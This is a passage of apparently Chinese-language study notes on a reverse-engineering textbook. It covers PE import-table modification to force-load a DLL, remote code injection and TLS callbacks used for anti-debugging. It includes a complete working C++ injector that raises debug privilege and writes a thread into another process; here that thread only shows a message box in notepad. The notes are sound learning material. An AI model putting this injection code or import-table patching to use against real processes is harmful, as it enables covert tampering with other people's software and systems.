class="comment">//接收路径的字符缓冲区的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>; <span class="comment">//函数返回当前进程已加载可执行或DLL文件的完整路径名(以'\0'终止)</span></span><br><span class="line"></span><br><span class="line">_tcsrchr("字符串"， '要查找的字符')</span><br><span class="line"><span class="comment">//返回值：指向最后一次在字符串中出现的该字符的指针，如果要查找的字符再串中没有出现，则返回NULL。</span></span><br><span class="line"></span><br><span class="line">_tcschr("字符串"， '要查找的字符')</span><br><span class="line"><span class="comment">//返回值：指向第一次在字符串中出现的该字符的指针，如果要查找的字符再串中没有出现，则返回NULL。</span></span><br></pre></td></tr></table></figure><p>由于PE文件中导入的DLL信息以结构体列表形式存储在IDT。</p><p>首先查看IDT的所占空间，找到地址，发现以NULL结尾的IID后存在其他数据。所以要添加一个IID的话，我们就要移动IDT到一个新的足够大空间，再在其尾部添加一个IID。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917221854666.png" alt="image-20200917221854666"></p><p>确定移动目标位置：(3种方式)</p><ol><li>查找文件的空白区域。</li><li>增加文件最后一个节区的大小。</li><li>在文件末尾添加新节区。</li></ol><p>首先直接查看本节区中的空白区域，发现有足够的空间，但要计算该区域中加载到进程的虚拟内存的区域，因为只有节区头明确记录的区域才会被加载。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917222618970.png" alt="image-20200917222618970"></p><p>所以还有未被使用的区域大小为：1AA，这是足够的。</p><blockquote><p>节区在磁盘文件中的大小比加载到内存的大小大的原因：</p><p><strong>文件的大小是经过文件对齐后的。</strong></p></blockquote><p>开始修改要记载指定dll的文件：</p><ol><li><p>修改导入表的RVA值及大小。（新移动的区域）</p></li><li><p>删除绑定导入表。（可有可无，提高DLL加载速度的技术）</p><p><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917223157443.png" alt="image-20200917223157443"></p></li><li><p>创建新的IDT，将原IDT复制到新区域并在尾巴添加新的IID。</p></li><li><p>设置Name，INT，IAT。（PE学习已经详细记录了，这里就就只是实操了下）。</p></li><li><p>修改IAT节区的属性值，增加可写属性。<strong>IMAGE_SCN_MEM_WRITE(80000000)</strong>。<strong>所以从40000040 -&gt; C0000040。</strong></p></li></ol><p><strong>最后本章主要是还是对PE文件熟悉了下。</strong></p><hr><h2 id="第二十七章-代码注入"><a href="#第二十七章-代码注入" class="headerlink" title="第二十七章 代码注入"></a>第二十七章 代码注入</h2><p>之前学习了DLL注入，而代码注入与之最大的区别就是只向目标进程注入要运行的代码与数据，注入完成后之后消失。原理类似。</p><p>使用dll注入优点：1.占用内存少。2.难以查找痕迹。3.不需要另外的dll文件，只要有代码注入程序即可。</p><p><strong>整个流程：</strong></p><ul><li><p>改变进程的权限进行提取。</p></li><li><p>代码注入：</p><ol><li>使用GetModuleHandleA()函数获得指定模块（kernel.dll）的句柄，为了获得要用函数的地址。</li><li>使用OpenProcess()函数获得指定PID号的进程的句柄。</li><li>设置THREAD_PARAM结构体变量并对其赋值（<strong>所要使用的函数地址，字符串</strong>），在目标进程申请内存，将该结构体写入目标进程。</li><li>计算出线程函数的大小，在目标进程申请内存，将线程函数的代码写入目标进程。</li><li>使用CreateRemoteThread()函数在目标进程创建一个远程线程（<strong>利用已经写入目标进程内存的数据</strong>）。</li></ol></li></ul><blockquote><p>tips:</p><p>Window OS中，加载到进程的kernel32.dll的地址都相同，所以我们在注入程序中获得的API(“LoadLibraryA”，“GetProcAddress”)的地址与目标程序进程中获取的同然的API的地址是相同的。因此可以直接在注入程序中获得函数的地址。</p></blockquote><p>其实整个流程也很简单，但熟练，用的好还是要多实战经历。</p><p>完整代码：（注释可以看的很清楚）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef int (FAR WINAPI *FARPROC)(); 可以在编译器中查看到。</span></span><br><span class="line"><span class="comment">//typedef _Null_terminated_ CONST CHAR *LPCSTR, *PCSTR;</span></span><br><span class="line"><span class="comment">//#define WINAPI      __stdcall</span></span><br><span class="line"><span class="comment">//typedef void far            *LPVOID;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//函数指针数组</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()</span></span><br><span class="line">    <span class="keyword">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"</span></span><br><span class="line">&#125; THREAD_PARAM, * PTHREAD_PARAM;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LoadLibraryA()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* PFLOADLIBRARYA)</span> <span class="comment">//对函数定义一个别名，下面同。</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetProcAddress()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* PFGETPROCADDRESS)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//MessageBoxA()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* PFMESSAGEBOXA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// "user32.dll"</span></span><br><span class="line">    <span class="keyword">if</span> (!hMod)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// "MessageBoxA"</span></span><br><span class="line">    <span class="keyword">if</span> (!pFunc)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()</span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectCode</span><span class="params">(DWORD dwPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_PARAM    param = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    HANDLE          hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE          hThread = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID          pRemoteBuf[<span class="number">2</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    DWORD           dwSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set THREAD_PARAM</span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">"user32.dll"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">"MessageBoxA"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">"Injected by Bxb"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">"ReverseCore"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open Process</span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,   <span class="comment">// dwDesiredAccess</span></span><br><span class="line">        FALSE,                <span class="comment">// bInheritHandle</span></span><br><span class="line">        dwPID)))             <span class="comment">// dwProcessId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcess() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for THREAD_PARAM</span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">        dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">        MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">        PAGE_READWRITE)))    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">        pRemoteBuf[<span class="number">0</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">        (LPVOID)&amp;param,                 <span class="comment">// lpBuffer</span></span><br><span class="line">        dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">        <span class="literal">NULL</span>))                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for ThreadProc()</span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">        dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">        MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">        PAGE_EXECUTE_READWRITE)))    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">        pRemoteBuf[<span class="number">1</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">        (LPVOID)ThreadProc,             <span class="comment">// lpBuffer</span></span><br><span class="line">        dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">        <span class="literal">NULL</span>))                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hThread = CreateRemoteThread(hProcess,            <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                <span class="comment">// lpThreadAttributes</span></span><br><span class="line">        <span class="number">0</span>,                   <span class="comment">// dwStackSize</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],     <span class="comment">// dwStackSize</span></span><br><span class="line">        pRemoteBuf[<span class="number">0</span>],       <span class="comment">// lpParameter</span></span><br><span class="line">        <span class="number">0</span>,                   <span class="comment">// dwCreationFlags</span></span><br><span class="line">        <span class="literal">NULL</span>)))             <span class="comment">// lpThreadId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateRemoteThread() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE); <span class="comment">//一直等待上面的线程结束，发出信号。</span></span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> <span class="comment">//进行提权。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcessToken error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LookupPrivilegeValue error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"AdjustTokenPrivileges error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The token does not have the specified privilege. \n"</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n USAGE  : %s &lt;pid&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// code injection</span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);</span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向notepad注入显示一个对话框的代码并调试注入代码：</p><p>首先查看将notepad加载入OD并运行，然后使用Process Explorer进程管理查看notepad的PID；OD中设置事件终止在新的线程（<strong>即我们在另一个程序使用CreateRemoteThread()在notepad中创建的线程</strong>）。</p><p>开始注入，OD中成功暂停在新的线程。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917163730590.png" alt="image-20200917163730590"></p><p>成功。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917163853250.png" alt="image-20200917163853250"></p><p>另外有一个注意的就是，使用VS编译上面的代码时一定要选release编译选项，不然会注入失败。。原因之一是：release编译选项的编译的exe中二进制代码函数的顺序与源代码中的一致，这样就能使用后一个函数减前一个函数获得函数的大小。其他原因暂时不知道。。。</p><p>最后，win32编程要多熟悉熟悉才行。。</p><hr><h2 id="第四十一章-ASLR"><a href="#第四十一章-ASLR" class="headerlink" title="第四十一章 ASLR"></a>第四十一章 ASLR</h2><p>总结在其他帖子：<strong><a href="http://www.bxnop.cn/2020/05/12/ASLR/">http://www.bxnop.cn/2020/05/12/ASLR/</a></strong></p><hr><h2 id="第四十五章-TLS回调函数"><a href="#第四十五章-TLS回调函数" class="headerlink" title="第四十五章 TLS回调函数"></a>第四十五章 TLS回调函数</h2><h3 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h3><p>TLS是各线程的独立的数据存储空间，用来保存变量或回调函数。使用TLS技术可在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样。</p><p>TLS回调函数是指，每当创建或终止进程时，TLS回调函数都会自动调用执行，前后共2次，执行进程的主线程（运行进程的EP代码）前，TLS回调函数会先别调用执行，这使得该特征应用于反调试技术。</p><p>若编程中启用了TLS功能，PE头文件就会设置TLS表（TLS Table）项目，即可选头中的<strong>IMAGE_DATA-DRRECTORY[9]</strong>记录了TLS表的RVA与SIZE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD StartAddressOfRawData; <span class="comment">//TLS静态数据开始地址</span></span><br><span class="line">    DWORD EndAddressOfRawData; <span class="comment">//TLS静态数据结束地址</span></span><br><span class="line">    DWORD AddressOfIndex; <span class="comment">//PDWORD</span></span><br><span class="line">    DWORD AddressOfCallBacks; <span class="comment">//PIMAGE_TLS_CALLBACK * ，执行函数指针(VA)数组。</span></span><br><span class="line">    DWORD SizeOfZeroFill; <span class="comment">//直接填充为0的大小</span></span><br><span class="line">    DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 *PIMAGE_TLS_DIRECTORY32;</span><br><span class="line"></span><br><span class="line">静态数据总大小就是EndAddressOfRawData-StartAddressOfRawData+SizeOfZeroFill</span><br></pre></td></tr></table></figure><blockquote><p>IMAGE_TLS_DIRECTORY结构体有2种版本，分别为32位（大小：18h）与64位，但只是成员字节大小不一样。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TLS Callback回调函数的定义：</span><br><span class="line"><span class="keyword">typedef</span> VOID </span><br><span class="line">(NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DLLHandle,DWORD Reason,PVOID Reserved);</span><br><span class="line"></span><br><span class="line">其中参数Reason为调用回调函数的原因:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_ATTACH 1 进程启动</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_ATTACH 2 线程启动</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_DERACH 3 线程退出</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_DETACH 0 进程退出</span></span><br></pre></td></tr></table></figure><h3 id="调试TLS回调函数"><a href="#调试TLS回调函数" class="headerlink" title="调试TLS回调函数"></a>调试TLS回调函数</h3><p>因为TLS回调函数在EP代码之前被调用执行了，直接使用调试器打开是无法调试的。</p><p>修改ollydbg的选项，让调试器暂停的位置是系统断点（System Startup Breakpoint）来调试TLS回调函数。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200711093140091.png" 